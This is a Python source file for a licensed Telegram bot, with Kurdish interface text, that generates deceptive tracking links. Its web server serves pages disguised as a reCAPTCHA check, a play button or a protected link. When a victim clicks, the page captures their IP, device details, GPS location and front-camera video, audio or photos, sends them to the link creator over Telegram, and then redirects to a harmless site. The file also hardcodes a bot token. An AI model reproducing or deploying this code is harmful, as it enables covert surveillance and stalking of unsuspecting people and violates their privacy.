import asyncio
import logging
import os
import base64
import sqlite3
import random
import string
from datetime import datetime, timedelta
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command

TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
ADMIN_ID = 5583813672
FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

user_states = {}
user_languages = {}

# -- داتابەیس --
def init_db():
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS licenses (
            key TEXT PRIMARY KEY,
            user_id INTEGER,
            expiry_date TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS short_links (
            short_code TEXT PRIMARY KEY,
            payload_data TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def add_license(key: str, days: int = 30):
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO licenses (key, user_id, expiry_date) VALUES (?, NULL, ?)", (key, expiry))
    conn.commit()
    conn.close()

def check_license(user_id: int):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date FROM licenses WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        try:
            expiry_date = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            if datetime.now() < expiry_date:
                return True
        except:
            pass
    return False

def activate_key(user_id: int, key: str):
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date, user_id FROM licenses WHERE key = ?", (key,))
    row = cursor.fetchone()
    if row:
        db_expiry, db_user = row
        if db_user is None or db_user == user_id:
            expiry = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute("UPDATE licenses SET user_id = ?, expiry_date = ? WHERE key = ?", (user_id, expiry, key))
            conn.commit()
            conn.close()
            return True
    conn.close()
    return False

def create_short_link(payload_data: str):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO short_links (short_code, payload_data) VALUES (?, ?)", (code, payload_data))
    conn.commit()
    conn.close()
    return code

def get_payload_from_short(code: str):
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT payload_data FROM short_links WHERE short_code = ?", (code,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return row[0]
    return None

# -- دەقەکانی بۆت --
TEXTS = {
    "ku": {
        "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
        "menu_stats": "📊 باری سیستەم",
        "welcome": "🌟 **بەخێر بێیت بۆ سیستەمی هەواڵگری گشتی!**\n\n🔑 تکایە کلیلی چالاککردن (License Key) بنووسە:",
        "stats": "📊 **بارودۆخی سیستەم:**\n\n• دخ: 🟢 ۱۰۰٪ کارا\n• سیستەمی مۆد: 🎥 ڤیدیۆ | 📸 ڕەسم\n• دیزاینەکان: ۳ شێوازی مۆدێرن",
        "ask_mode": "⚙️ **هەنگاوی یەکەم:**\nفەرموو جۆری هەواڵگرییەکە هەڵبژێرە:",
        "ask_template": "🎨 **هەنگاوی دووەم:**\nفەرموو دیزاینی پەڕەی فێڵەکە هەڵبژێرە:",
        "ask_redirect": "🔗 **هەنگاوی سێیەم:**\nفەرموو لینکی مەبەست (Redirect Link) بنێرە (وەک `https://snapchat.com/...`)",
        "link_success": "🎯 **لینکی هەواڵگری بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییەکان:**\n• جۆر: `{mode}`\n• دیزاین: `{template}`\n• سیستەمی زیرەکی IP و GPS کارایە.",
        "key_active": "🟢 **کلیلەکە چالاک بوو!**",
        "key_invalid": "❌ **کلیلەکە هەڵەیە یان بەسەرچووە.**",
        "expired": "❌ **ماوەی کلیلەکەت بەسەرچووە!**"
    }
}

def get_reply_menu():
    t = TEXTS["ku"]
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t["menu_link"]), KeyboardButton(text=t["menu_stats"])]
        ],
        resize_keyboard=True
    )

# -- فەرمانەکانی بۆت --
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        await message.answer("🌟 **بەخێر بێیتەوە سەرۆک!**\n`/genkey <کلیل>`", reply_markup=get_reply_menu())
        return

    if check_license(user_id):
        await message.answer("🟢 کلیلی تو کارایە و سیستەم ئامادەیە.", reply_markup=get_reply_menu())
    else:
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS["ku"]["welcome"])

@dp.message(Command("genkey"))
async def generate_key_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ نموونە: `/genkey SURCHI2026`")
        return
    key = args[1].strip()
    add_license(key, days=30)
    await message.answer(f"✅ **کلیل دروست کرا:** `{key}`")

@dp.message(F.text == "🔗 دروستکردنی لینکی هەواڵگری")
async def start_link_creation(message: Message):
    user_id = message.from_user.id
    if not check_license(user_id):
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS["ku"]["expired"])
        return
    
    # پرسیارکردن بۆ جۆری مۆد
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎥 ڤیدیۆ و دەنگ", callback_data="mode_video")],
        [InlineKeyboardButton(text="📸 تەنیا ڕەسمی بەردەوام", callback_data="mode_photo")]
    ])
    user_states[user_id] = {"step": "waiting_mode"}
    await message.answer(TEXTS["ku"]["ask_mode"], reply_markup=kb)

@dp.message(F.text == "📊 باری سیستەم")
async def system_stats(message: Message):
    if check_license(message.from_user.id):
        await message.answer(TEXTS["ku"]["stats"], reply_markup=get_reply_menu())

@dp.callback_query(F.data.startswith("mode_"))
async def cb_mode_selection(callback: CallbackQuery):
    user_id = callback.from_user.id
    mode = callback.data.split("_")[1]
    
    user_states[user_id]["mode"] = mode
    user_states[user_id]["step"] = "waiting_template"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤖 فێڵی Not a Robot", callback_data="tpl_robot")],
        [InlineKeyboardButton(text="▶️ دوگمەی پەخشی دەنگ/ڤیدیۆ", callback_data="tpl_play")],
        [InlineKeyboardButton(text="🔗 کلیک بۆ بینینی لینک", callback_data="tpl_link")]
    ])
    
    await callback.message.edit_text(TEXTS["ku"]["ask_template"], reply_markup=kb)

@dp.callback_query(F.data.startswith("tpl_"))
async def cb_template_selection(callback: CallbackQuery):
    user_id = callback.from_user.id
    template = callback.data.split("_")[1]
    
    user_states[user_id]["template"] = template
    user_states[user_id]["step"] = "waiting_redirect"
    
    await callback.message.edit_text(TEXTS["ku"]["ask_redirect"])

@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_inputs(message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if text in ["🔗 دروستکردنی لینکی هەواڵگری", "📊 باری سیستەم"]:
        return

    state_info = user_states.get(user_id, {})
    step = state_info.get("step")
    
    if step == "waiting_key":
        if activate_key(user_id, text):
            user_states[user_id] = {}
            await message.answer(TEXTS["ku"]["key_active"], reply_markup=get_reply_menu())
        else:
            await message.answer(TEXTS["ku"]["key_invalid"])
        return

    if not check_license(user_id):
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS["ku"]["expired"])
        return

    if step == "waiting_redirect":
        mode = state_info.get("mode", "video")
        template = state_info.get("template", "robot")
        
        # دروستکردنی پەیلۆد: ئایدی|مۆد|دیزاین|لینکی_مەبەست
        payload_data = f"{user_id}|{mode}|{template}|{text}"
        short_code = create_short_link(payload_data)
        
        railway_domain = FIXED_DOMAIN
        if not railway_domain.startswith("http"):
            railway_domain = f"https://{railway_domain}"
            
        payload_link = f"{railway_domain}/s/{short_code}"
        
        mode_str = "ڤیدیۆ و دەنگ" if mode == "video" else "ڕەسمی بەردەوام"
        tpl_str = "Not a Robot" if template == "robot" else ("دوگمەی پەخش" if template == "play" else "کردنەوەی لینک")
        
        response_text = TEXTS["ku"]["link_success"].format(
            payload_link=payload_link, 
            mode=mode_str, 
            template=tpl_str
        )
        
        user_states[user_id] = {}
        await message.answer(response_text, parse_mode="Markdown", reply_markup=get_reply_menu())

# -- وێب سێرڤەر و پەڕەی فێڵ --
async def short_link_handler(request: web.Request):
    short_code = request.match_info.get('code', '')
    payload_data = get_payload_from_short(short_code)
    
    if not payload_data:
        return web.Response(text="Link expired or invalid.", content_type='text/html')
        
    try:
        parts = payload_data.split("|", 3)
        target_user_id = parts[0]
        mode = parts[1]
        template = parts[2]
        redirect_url = parts[3]
    except:
        target_user_id = str(ADMIN_ID)
        mode = "video"
        template = "robot"
        redirect_url = 'https://snapchat.com'
        
    user_agent = request.headers.get('User-Agent', 'Unknown Browser/Device')
    ip = request.headers.get('X-Forwarded-For', request.remote)
    
    # 1. ڕێکخستنی دیزاینی HTML بەپێی هەڵبژاردنەکە
    html_body = ""
    if template == "robot":
        html_body = """
        <div class="recaptcha-box" id="clickContainer" onclick="runEngine()">
            <div class="recaptcha-left">
                <div class="checkbox-container" id="checkContainer"><input type="checkbox"></div>
                <div class="spinner-border" id="spinner"></div>
                <div class="recaptcha-text">I'm not a robot</div>
            </div>
            <div class="recaptcha-right">
                <svg width="32" height="32" viewBox="0 0 32 32"><path fill="#4285F4" d="M16 4l12 7v10l-12 7-12-7V11z"/></svg>
                <div class="logo-text">reCAPTCHA</div><div class="logo-sub">Privacy - Terms</div>
            </div>
        </div>
        """
    elif template == "play":
        html_body = """
        <div class="box" id="clickContainer" onclick="runEngine()">
            <div class="icon-circle"><div class="play-triangle"></div></div>
            <h3>پەخشی ناوەڕۆک</h3>
            <p>تکایە بۆ بینین و گوێگرتن لە ناوەڕۆکەکە، پەنجە بنێ لێرە.</p>
            <div class="spinner-border" id="spinner" style="margin:10px auto;"></div>
        </div>
        """
    else: # link
        html_body = """
        <div class="link-box" id="clickContainer" onclick="runEngine()">
            <h3>🔗 بەستەری پارێزراو</h3>
            <p>لینکی مەبەست ئامادەیە. بۆ کردنەوەی پەنجە بەم دوگمەیەدا بنێ.</p>
            <button class="btn-continue">چوونە ناو بەستەر</button>
            <div class="spinner-border" id="spinner" style="margin:15px auto;"></div>
        </div>
        """

    # 2. ڕێکخستنی سکریپتی جۆری تۆمارکردن (ڤیدیۆ یان ڕەسمی بەردەوام)
    if mode == "video":
        engine_script = """
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(function(stream) {
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                let mediaRecorder;
                try {
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                } catch (e) {
                    try { mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' }); } 
                    catch (err) { mediaRecorder = new MediaRecorder(stream); }
                }
                
                let chunks = [];
                mediaRecorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                
                mediaRecorder.onstop = function() {
                    let blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'video/webm' });
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = function() {
                        fetch('/upload_video', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ video: reader.result, owner: targetUserId })
                        }).then(() => {
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redirectTarget;
                        }).catch(() => { window.location.href = redirectTarget; });
                    };
                };
                
                mediaRecorder.start();
                setTimeout(function() { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 4000);
            }).catch(function() { window.location.href = redirectTarget; });
        """
    else: # photo
        engine_script = """
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(function(stream) {
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                let canvas = document.createElement('canvas');
                let context = canvas.getContext('2d');
                let shots = 0;
                
                let interval = setInterval(function() {
                    if(video.videoWidth > 0) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let base64data = canvas.toDataURL('image/jpeg', 0.8);
                        
                        fetch('/upload_photo', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: base64data, owner: targetUserId })
                        });
                        shots++;
                    }
                    if(shots >= 4) { // پاش ٤ ڕەسم (واتە نزیکەی ٦ چرکە) دەیباتە لینکەکە
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = redirectTarget;
                    }
                }, 1500); // هەر ١.٥ چرکە جارێک
            }).catch(function() { window.location.href = redirectTarget; });
        """

    html_content = f"""<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body {{
            background: #f1f3f4; color: #202124; font-family: Roboto, Arial, sans-serif;
            text-align: center; display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0; overflow: hidden;
        }}
        .recaptcha-box, .box, .link-box {{
            background: #fff; border: 1px solid #d3d3d3; box-shadow: 0 0 10px rgba(0,0,0,0.1);
            border-radius: 8px; padding: 25px; max-width: 320px; width: 90%; cursor: pointer;
        }}
        .recaptcha-box {{ display: flex; justify-content: space-between; align-items: center; padding: 20px; }}
        .recaptcha-left {{ display: flex; align-items: center; gap: 12px; }}
        .checkbox-container {{ width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; }}
        .spinner-border {{ width: 28px; height: 28px; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; display: none; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .icon-circle {{ width: 65px; height: 65px; background: linear-gradient(135deg, #0ea5e9, #2563eb); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 15px; }}
        .play-triangle {{ border-top: 10px solid transparent; border-bottom: 10px solid transparent; border-left: 16px solid #fff; margin-left: 4px; }}
        .btn-continue {{ background: #2563eb; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; font-size: 16px; margin-top: 10px; font-weight: bold; width: 100%; cursor: pointer; }}
        h3 {{ margin: 0 0 10px 0; font-size: 18px; }} p {{ margin: 0; font-size: 13px; color: #555; }}
    </style>
</head>
<body>
    {html_body}
    <video id="v" autoplay playsinline muted style="display:none;"></video>

    <script>
        const redirectTarget = "{redirect_url}";
        const targetUserId = "{target_user_id}";
        
        fetch('/save_info', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ userAgent: "{user_agent}", ip: "{ip}", owner: targetUserId }})
        }});

        function runEngine() {{
            document.getElementById('clickContainer').style.pointerEvents = 'none';
            let spinner = document.getElementById('spinner');
            if(spinner) spinner.style.display = 'block';
            let chk = document.getElementById('checkContainer');
            if(chk) chk.style.display = 'none';

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(function(pos) {{
                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
                }}, function() {{}}, {{ timeout: 5000, enableHighAccuracy: true }});
            }}

            {engine_script}
        }}
    </script>
</body>
</html>"""
    return web.Response(text=html_content, content_type='text/html')

async def save_info(request):
    try:
        data = await request.json()
        owner = int(data.get('owner', ADMIN_ID))
        await bot.send_message(chat_id=owner, text=f"👑 **زانیاری نوێ:**\n🌐 **IP:** `{data.get('ip')}`\n💻 **ئامێر:** `{data.get('userAgent')}`")
    except: pass
    return web.json_response({"status": "ok"})

async def upload_video(request):
    try:
        data = await request.json()
        owner = int(data.get('owner', ADMIN_ID))
        video_data = data.get('video')
        if video_data and "," in video_data:
            video_bytes = base64.b64decode(video_data.split(",", 1)[1])
            await bot.send_video(chat_id=owner, video=BufferedInputFile(video_bytes, filename="stream.mp4"), caption="🚨 **ڤیدیۆ تۆمارکرا!**")
    except: pass
    return web.json_response({"status": "ok"})

async def upload_photo(request):
    try:
        data = await request.json()
        owner = int(data.get('owner', ADMIN_ID))
        image_data = data.get('image')
        if image_data and "," in image_data:
            img_bytes = base64.b64decode(image_data.split(",", 1)[1])
            await bot.send_photo(chat_id=owner, photo=BufferedInputFile(img_bytes, filename="cam.jpg"), caption="📸 **ڕەسمی نوێی قوربانی گیرا!**")
    except: pass
    return web.json_response({"status": "ok"})

async def save_location(request):
    lat = request.query.get('lat')
    lon = request.query.get('lon')
    owner = int(request.query.get('owner', ADMIN_ID))
    if lat and lon:
        await bot.send_location(chat_id=owner, latitude=float(lat), longitude=float(lon))
    return web.json_response({"status": "ok"})

async def index_handler(request):
    return web.Response(text="System Active.", content_type='text/html')

async def main():
    app = web.Application(client_max_size=50*1024*1024)
    app.router.add_get('/', index_handler)
    app.router.add_get('/s/{code}', short_link_handler)
    app.router.add_post('/save_info', save_info)
    app.router.add_post('/upload_video', upload_video)
    app.router.add_post('/upload_photo', upload_photo)
    app.router.add_get('/save_location', save_location)

    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logging.info(f"Royal Web Server started on port {port}.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
